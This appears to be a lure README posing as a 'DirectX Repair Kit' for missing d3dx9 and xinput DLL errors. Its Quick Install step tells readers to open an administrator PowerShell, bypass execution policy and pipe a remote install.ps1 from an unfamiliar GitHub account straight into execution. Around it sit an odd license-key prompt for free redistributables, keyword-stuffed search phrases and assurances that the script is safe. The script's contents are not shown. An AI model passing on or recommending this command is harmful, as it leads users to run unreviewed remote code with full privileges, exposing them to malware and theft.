# DirectX Repair Kit — PowerShell

**DirectX-Repair-Kit-PowerShell**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.4.0-stable-brightgreen?style=flat-square)]()
[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()

Fix d3dx9_43.dll, xinput1_3.dll and DirectX runtime errors for games on Windows.

---

## Quick Install

Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

The installer downloads the latest build, prompts for your license key and completes setup automatically.

## Step-by-Step

| Step | Action |
|------|--------|
| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
| 2 | Paste the command block above and press **Enter** |
| 3 | Wait for download — progress shown in the console |
| 4 | Enter license key when prompted (also in `license.txt` after install) |
| 5 | Restart if the installer asks — then launch from Start menu |

If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.

---

## Overview

Install DirectX Repair Kit via PowerShell — fix missing d3dx9_43.dll, xinput1_3.dll and DirectX 9/10/11 runtime errors on Windows 10/11 games.

## Common Searches

- d3dx9_43.dll is missing
- xinput1_3.dll not found
- d3dcompiler_47.dll was not found
- directx end-user runtime windows 11
- game crash directx error startup

## Features

* **d3dx9 DLLs** — Installs d3dx9_24 through d3dx9_43 automatically.
* **XInput** — Fixes xinput1_1 through xinput1_4 missing errors.
* **d3dcompiler** — Installs d3dcompiler_33 through d3dcompiler_47.
* **One-click** — Detects missing DLLs and installs correct runtime pack.
* **All games** — Works with any game using legacy DirectX 9/10/11 APIs.

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum |
| PowerShell | 5.1 or PowerShell 7+ |
| Admin | Required |
| Network | Required for download |

## FAQ

**How do I install without a browser?**
Use the PowerShell command above — no browser needed after Admin shell is open.

**Where is the license key?**
Shown during install and saved to `license.txt` in the install folder.

**Is the script safe to run?**
Hosted on GitHub raw; review `install.ps1` before running if you prefer.

**"d3dx9_43.dll is missing"?**
Installs DirectX End-User Runtime — standard fix for this error.

**"xinput1_3.dll not found"?**
Adds XInput components from DirectX redistributable.

**Windows 11 still needs this?**
Yes — Win11 ships DX12 but not legacy DX9/10/11 runtimes.

**Safe for games?**
Official Microsoft DirectX redistributable packages only.

---

TAGS directx repair, d3dx9_43.dll missing, xinput1_3.dll, directx fix windows 11, directx end-user runtime, powershell install, windows setup script

## License

[MIT](LICENSE)
